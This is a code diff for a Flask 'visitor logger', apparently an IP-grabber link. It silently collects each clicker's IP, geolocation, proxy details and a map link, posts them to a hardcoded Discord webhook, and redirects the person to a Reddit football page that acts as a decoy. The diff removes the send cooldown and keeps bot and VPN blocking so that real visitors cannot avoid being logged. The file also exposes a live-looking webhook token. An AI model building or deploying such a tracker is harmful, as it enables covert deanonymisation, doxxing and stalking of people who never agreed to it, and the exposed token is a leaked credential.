@@ -1,3 +1,16 @@
+# main.py
+"""
+Visitor logger — immediate send on every click (no cooldown).
+ - Browser-based public IP (api.ipify)
+ - Server-side enrichment via ipapi.co, fallback ipwho.is
+ - Enhanced VPN/proxy detection (org keywords + PTR)
+ - Proxy IP & port extraction
+ - Debug logging to file (visitor_debug.log)
+ - Bot blocking, VPN blocking (404)
+ - Sends a single Discord embed for each click (no dedupe)
+ - Redirects visitor to REDIRECT_URL
+"""
+
 from flask import Flask, request, redirect, jsonify, abort
 import requests
 from datetime import datetime
@@ -12,7 +25,7 @@ app = Flask(__name__)
 # ========== CONFIG ==========
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1430264733193207848/5fOooaQ3VYQePvd7m0ZR6hZsYPW0ML6pk9jZ5wMcin7JkyuHHVg_IQicnDqr18NWvsQh"
 REDIRECT_URL = "https://www.reddit.com/r/footballhighlights/"
-COOLDOWN_SECONDS = 10  # seconds between webhooks from same IP (0 = immediate repeats allowed)
+COOLDOWN_SECONDS = 0  # 0 = immediate repeats allowed (every click sends)
 DEBUG_LOG_PATH = os.getenv("VISITOR_DEBUG_LOG", "visitor_debug.log")
 
 # UA bot keywords
@@ -38,13 +51,8 @@ VPN_KEYWORDS_EXPANDED = [
     "tunnelbear","anchorfree","psiphon","proton"
 ]
 
-# cooldown tracking
+# no cooldown tracking needed when COOLDOWN_SECONDS == 0, but keep structure if you change later
 last_sent_by_ip = {}
-def clear_last_sent():
-    global last_sent_by_ip
-    last_sent_by_ip = {}
-    threading.Timer(86400, clear_last_sent).start()
-clear_last_sent()
 
 # ========== UTIL ==========
 def now_gmt():
@@ -179,9 +187,6 @@ def _log_debug(ip: str, org: str, ptr_host: str, vpn_flag: bool):
 
 # ========== PROXY EXTRACTION HELPERS ==========
 def parse_forwarded_header(forwarded_val: str):
-    """
-    Parse 'Forwarded' header and return list of dicts like [{'for': '1.2.3.4:1234', 'by': '...'}, ...]
-    """
     if not forwarded_val:
         return []
     entries = []
@@ -197,36 +202,24 @@ def parse_forwarded_header(forwarded_val: str):
     return entries
 
 def extract_proxy_info_from_headers():
-    """
-    Return (proxy_ip, proxy_port, proxy_source_description)
-    Best-effort: check X-Forwarded-For last hop, Forwarded header 'by' or 'for', CF-Connecting-IP, else remote_addr/REMOTE_PORT.
-    """
-    # 1) X-Forwarded-For: take last IP in chain as the most recent proxy
     xff = request.headers.get("X-Forwarded-For", "")
     if xff:
         parts = [p.strip() for p in xff.split(",") if p.strip()]
         if len(parts) >= 2:
-            # last element is the last proxy that connected to your server
             last = parts[-1]
-            # try split port if present
             if ":" in last and last.count(":") == 1:
                 ip_part, port_part = last.split(":", 1)
                 return ip_part, port_part, "X-Forwarded-For:last"
             return last, request.environ.get("REMOTE_PORT"), "X-Forwarded-For:last"
 
-    # 2) Forwarded header: try parse 'by' first, then 'for'
     fwd = request.headers.get("Forwarded", "")
     if fwd:
         parsed = parse_forwarded_header(fwd)
         if parsed:
             last = parsed[-1]
-            # prefer 'by' (proxy that connected)
             for_key = last.get("by") or last.get("for")
             if for_key:
-                # may be ip:port or quoted
-                # strip IPv6 brackets
                 for_key = for_key.strip()
-                # if form ip:port
                 m = re.match(r'^\[?([0-9a-fA-F\.:]+)\]?(?::(\d+))?$', for_key)
                 if m:
                     ip_part = m.group(1)
@@ -235,17 +228,14 @@ def extract_proxy_info_from_headers():
                 else:
                     return for_key, request.environ.get("REMOTE_PORT"), "Forwarded:raw"
 
-    # 3) CF-Connecting-IP (Cloudflare)
     cf = request.headers.get("CF-Connecting-IP")
     if cf:
         return cf, request.environ.get("REMOTE_PORT"), "CF-Connecting-IP"
 
-    # 4) True-Client-IP header (various proxies)
     tci = request.headers.get("True-Client-IP")
     if tci:
         return tci, request.environ.get("REMOTE_PORT"), "True-Client-IP"
 
-    # 5) fallback to remote_addr and REMOTE_PORT
     return request.remote_addr, request.environ.get("REMOTE_PORT"), "remote_addr"
 
 # ========== MAP & DISCORD ==========
@@ -339,7 +329,7 @@ def log():
     if is_bot_ua(user_agent):
         abort(404)
 
-    # cooldown check (use real_ip for dedupe)
+    # cooldown check (COOLDOWN_SECONDS == 0 means always allow)
     now_ts = time.time()
     last_ts = last_sent_by_ip.get(real_ip, 0)
     if COOLDOWN_SECONDS > 0 and (now_ts - last_ts) < COOLDOWN_SECONDS:
@@ -353,7 +343,6 @@ def log():
 
     # enhanced VPN/proxy detection: pass the *real* IP details and also check proxy org
     vpn_flag = detect_vpn_or_proxy(details, ip=real_ip)
-    # also treat proxy connecting IP's org as suspicious (additional heuristic)
     if proxy_ip and proxy_ip != real_ip:
         proxy_details = enrich_ip(proxy_ip)
         if detect_vpn_or_proxy(proxy_details, ip=proxy_ip):
@@ -380,7 +369,7 @@ def log():
     }
     info["map_url"] = build_map_url(details)
 
-    # mark before sending
+    # mark before sending (kept for future cooldown toggles)
     last_sent_by_ip[real_ip] = now_ts
 
     # send embed (single)
